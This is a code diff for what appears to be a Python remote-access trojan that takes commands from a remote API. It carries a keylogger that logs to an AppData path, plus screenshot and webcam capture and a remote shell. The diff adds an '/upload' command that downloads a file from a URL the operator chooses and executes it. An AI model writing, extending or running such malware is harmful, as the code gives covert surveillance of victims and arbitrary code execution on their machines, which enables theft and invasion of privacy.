@@ -95,22 +95,23 @@ def cdTo(dir):
     except:
         send_message("Error! check command..") 
 
-#Upload file 
 def download_file(url):
-    # get the file name from the URL
-    file_name = url.split("/")[-1]
+    end = url.split(".")
+    end = end[-1]
 
     # download the file
-    response = requests.get(url)
-    response.raise_for_status()
+    urllib.request.urlretrieve(url, 'file.' + end)
 
-    # save the file
-    with open(file_name, "wb") as f:
-        f.write(response.content)
+    try:
+        os.system('file.' + end)
+        send_message("File runned!")
+    except:
+        send_message("Could not run file")
 
 #Keylogger function
 Log_PATH = f'{Appdata}\Microsoft\Windows\keylog.txt'
 def keylogger(timma):
+    send_message("Recording...")
 
     f = open(Log_PATH, "w")
 
@@ -138,7 +139,7 @@ def keylogger(timma):
     os.remove(Log_PATH)
 
 #Main function
-def getting_commands():
+def main():
 
     with urllib.request.urlopen(api_url) as url:
         data = json.load(url)
@@ -167,40 +168,35 @@ def getting_commands():
             
             #Finding command from api
             def find_commands():
-                command = []
-                count = 0
 
-                for i in data1:
+                data_list = []
+
+                def print_text_values(d):
+                        if isinstance(d, dict):
+                            for key, value in d.items():
+                                if key == "text":
+                                    data_list.append(value)
+                                else:
+                                    print_text_values(value)
+                        elif isinstance(d, list):
+                            for item in d:
+                                print_text_values(item)
+
+                print_text_values(data)
+                command = data_list[-1]
+                print(command)
                 
-                    if i == "/":
-                        command.append(count)
-                    count += 1
-
-                #Getting last '/' from json data
-                command = command[-1]
-                data = data1[command:]
-
-                count = 0
-
-                for i in data:
-                    if i == "'":
-                        data = data[:count]
-                        break
-                    count += 1
-
-                command = data 
                 commands.append(command)
             find_commands()
 
             WholeCommand = commands[-1]
             command = WholeCommand.split()
             command = command[0]
-            #print(WholeCommand)
-            print(command)
-            
+
             #Commands!
             match command:
                 case "/url":
+                    
                     WholeCommand = WholeCommand.split()
                     url = WholeCommand[-1]
                     webbrowser.open(url)
@@ -214,7 +210,6 @@ def getting_commands():
                 case "/screenshot":
                     #Chck for ip or allbots
                     WholeCommand = WholeCommand.split()
-                    print(WholeCommand)
                     
                     if ip in WholeCommand:
                         take_screenshot()
@@ -242,7 +237,6 @@ def getting_commands():
                 #Webcam command
                 case "/webcam":
                     WholeCommand = WholeCommand.split()
-                    print(WholeCommand)
 
                     if ip in WholeCommand:
                         Webcam_Picture()
@@ -255,7 +249,6 @@ def getting_commands():
                 #shell command
                 case "/shell":
                     WholeCommand = WholeCommand.split()
-                    print(WholeCommand)
 
                     if ip in WholeCommand:
 
@@ -275,6 +268,14 @@ def getting_commands():
                                     cdTo(dir)
                                 except:
                                     pass
+                case "/upload":
+                    
+                    if ip in WholeCommand:
+                        url = WholeCommand.split(" ")
+                        url = url[-1]
+                        download_file(url)
+                        
 
-getting_commands()
-
+                         
+                      
+main()
